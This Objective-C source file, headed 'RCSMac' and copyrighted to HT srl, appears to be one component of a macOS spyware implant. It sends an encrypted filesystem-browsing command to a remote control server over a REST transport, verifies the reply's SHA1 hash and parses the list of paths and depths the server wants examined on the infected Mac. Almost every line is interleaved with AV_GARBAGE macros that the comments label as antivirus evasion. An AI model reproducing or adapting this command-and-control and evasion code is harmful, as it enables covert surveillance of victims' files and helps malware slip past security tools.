/*
 * RCSMac - FileSystem Browsing Network Operation
 *
 *
 * Created by revenge on 12/01/2011
 * Copyright (C) HT srl 2011. All rights reserved
 *
 */

#import "FSNetworkOperation.h"
#import "NSMutableData+AES128.h"
#import "FSNetworkOperation.h"
#import "NSString+SHA1.h"
#import "NSData+SHA1.h"
#import "NSData+Pascal.h"
#import "RCSMCommon.h"

#import "RCSMLogger.h"
#import "RCSMDebug.h"

#import "RCSMAVGarbage.h"

@implementation FSNetworkOperation

@synthesize mPaths;

- (id)initWithTransport: (RESTTransport *)aTransport
{
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  if (self = [super init])
    {
      mTransport = aTransport;
      mPaths = [[NSMutableArray alloc] init];
      
      // AV evasion: only on release build
      AV_GARBAGE_000
      
      return self;
    }
  
  return nil;
}

- (void)dealloc
{
  [mPaths release];
  [super dealloc];
}

- (BOOL)perform
{
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  uint32_t command              = PROTO_FILESYSTEM;
  NSAutoreleasePool *outerPool  = [[NSAutoreleasePool alloc] init];
  NSMutableData *commandData    = [[NSMutableData alloc] initWithBytes: &command
                                                                length: sizeof(uint32_t)];
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  NSData *commandSha            = [commandData sha1Hash];
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  [commandData appendData: commandSha];
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  [commandData encryptWithKey: gSessionKey];
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  //
  // Send encrypted message
  //
  NSURLResponse *urlResponse    = nil;
  NSData *replyData             = nil;
  NSMutableData *replyDecrypted = nil;
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  replyData = [mTransport sendData: commandData
                 returningResponse: urlResponse];
  
  // AV evasion: only on release build
  AV_GARBAGE_008
  
  if (replyData == nil)
    {
      // AV evasion: only on release build
      AV_GARBAGE_002
    
      [commandData release];
      [outerPool release];
      
      // AV evasion: only on release build
      AV_GARBAGE_004
      
      return NO;
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_006
  
  replyDecrypted = [[NSMutableData alloc] initWithData: replyData];
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  [replyDecrypted decryptWithKey: gSessionKey];
  
  // AV evasion: only on release build
  AV_GARBAGE_004  
  
  [replyDecrypted getBytes: &command
                    length: sizeof(uint32_t)];
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  // remove padding
  [replyDecrypted removePadding];
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  //
  // check integrity
  //
  NSData *shaRemote;
  NSData *shaLocal;
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  @try
    {
      // AV evasion: only on release build
      AV_GARBAGE_001
      
      shaRemote = [replyDecrypted subdataWithRange:
                   NSMakeRange([replyDecrypted length] - CC_SHA1_DIGEST_LENGTH,
                               CC_SHA1_DIGEST_LENGTH)];
      
      // AV evasion: only on release build
      AV_GARBAGE_002
      
      shaLocal = [replyDecrypted subdataWithRange:
                  NSMakeRange(0, [replyDecrypted length] - CC_SHA1_DIGEST_LENGTH)];
    }
  @catch (NSException *e)
    {
      // AV evasion: only on release build
      AV_GARBAGE_002
    
      [replyDecrypted release];
      [commandData release];
      [outerPool release];
      
      // AV evasion: only on release build
      AV_GARBAGE_003
      
      return NO;
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_008
  
  shaLocal = [shaLocal sha1Hash];
  
  // AV evasion: only on release build
  AV_GARBAGE_009
  
  if ([shaRemote isEqualToData: shaLocal] == NO)
    {
      // AV evasion: only on release build
      AV_GARBAGE_002
    
      [replyDecrypted release];
      [commandData release];
      
      // AV evasion: only on release build
      AV_GARBAGE_006
      
      [outerPool release];
      
      // AV evasion: only on release build
      AV_GARBAGE_005
      
      return NO;
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  if (command != PROTO_OK)
    {
      // AV evasion: only on release build
      AV_GARBAGE_003
    
      [replyDecrypted release];
      [commandData release];
      
      // AV evasion: only on release build
      AV_GARBAGE_000
      
      [outerPool release];
      
      // AV evasion: only on release build
      AV_GARBAGE_001
      
      return NO;
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  uint32_t packetSize     = 0;
  uint32_t numOfEntries   = 0;
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  @try
    {      
      // AV evasion: only on release build
      AV_GARBAGE_002
      
      [replyDecrypted getBytes: &packetSize
                         range: NSMakeRange(4, sizeof(uint32_t))];
      
      // AV evasion: only on release build
      AV_GARBAGE_000
      
      [replyDecrypted getBytes: &numOfEntries
                         range: NSMakeRange(8, sizeof(uint32_t))];
    
      // AV evasion: only on release build
      AV_GARBAGE_000
    
    }
  @catch (NSException *e)
    {
      // AV evasion: only on release build
      AV_GARBAGE_002
      
      [replyDecrypted release];
      [commandData release];
      [outerPool release];
      
      // AV evasion: only on release build
      AV_GARBAGE_003
      
      return NO;
    }
  
  NSMutableData *data;
  @try
    {
      // AV evasion: only on release build
      AV_GARBAGE_002
    
      data = [NSMutableData dataWithData:
              [replyDecrypted subdataWithRange: NSMakeRange(12, packetSize - 4)]];
    }
  @catch (NSException *e)
    {
      // AV evasion: only on release build
      AV_GARBAGE_005
    
      [replyDecrypted release];
      [commandData release];
      [outerPool release];
      
      // AV evasion: only on release build
      AV_GARBAGE_006
      
      return NO;
    }
  
  uint32_t len = 0;
  uint32_t i   = 0;
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  //
  // Unpascalize n NULL terminated UTF16LE strings
  // depth(int) + UTF16-LE PASCAL Null-Terminated
  //
  for (; i < numOfEntries; i++)
    {
      uint32_t depth = 0;
      
      // AV evasion: only on release build
      AV_GARBAGE_008
      
      [data getBytes: &depth length: sizeof(uint32_t)];
      
      // AV evasion: only on release build
      AV_GARBAGE_007
      
      @try
        {
          // AV evasion: only on release build
          AV_GARBAGE_005
        
          [data getBytes: &len range: NSMakeRange(4, sizeof(uint32_t))];
          
          // AV evasion: only on release build
          AV_GARBAGE_004
        }
      @catch (NSException *e)
        {
          // AV evasion: only on release build
          AV_GARBAGE_003
        
          [replyDecrypted release];
          [commandData release];
          [outerPool release];
          
          // AV evasion: only on release build
          AV_GARBAGE_003
          
          return NO;
        }
      
      NSNumber *depthN = [NSNumber numberWithUnsignedInt: depth];
      
      // AV evasion: only on release build
      AV_GARBAGE_003
      
      NSData *stringData;
      
      @try
        {
          // AV evasion: only on release build
          AV_GARBAGE_003
        
          stringData  = [data subdataWithRange: NSMakeRange(4, len + 4)];
        }
      @catch (NSException *e)
        {
          // AV evasion: only on release build
          AV_GARBAGE_003        
          
          [replyDecrypted release];
          [commandData release];
          [outerPool release];
          
          // AV evasion: only on release build
          AV_GARBAGE_000
          
          return NO;
        }
      
      // AV evasion: only on release build
      AV_GARBAGE_001
      
      NSString *string    = [stringData unpascalizeToStringWithEncoding: NSUTF16LittleEndianStringEncoding];
      
      // AV evasion: only on release build
      AV_GARBAGE_003
      
      //
      // Serialize with depth in a NSMutableDictionary
      //
      NSArray *keys = [NSArray arrayWithObjects: @"depth",
                                                 @"path",
                                                 nil];
      
      // AV evasion: only on release build
      AV_GARBAGE_003
      
      NSArray *objects = [NSArray arrayWithObjects: depthN,
                                                    string,
                                                    nil];
      
      // AV evasion: only on release build
      AV_GARBAGE_004
      
      NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                             forKeys: keys];
      [mPaths addObject: dictionary];
      
      // AV evasion: only on release build
      AV_GARBAGE_003
      
      @try
        {
          // AV evasion: only on release build
          AV_GARBAGE_001
        
          [data replaceBytesInRange: NSMakeRange(0, len + 8)
                          withBytes: NULL
                             length: 0];
          
          // AV evasion: only on release build
          AV_GARBAGE_004
        }
      @catch (NSException *e)
        {
          
          // AV evasion: only on release build
          AV_GARBAGE_004
          
          [replyDecrypted release];
          [commandData release];
          [outerPool release];
          
          return NO;
        }
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  [replyDecrypted release];
  [commandData release];
  [outerPool release];
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  return YES;
}
@end
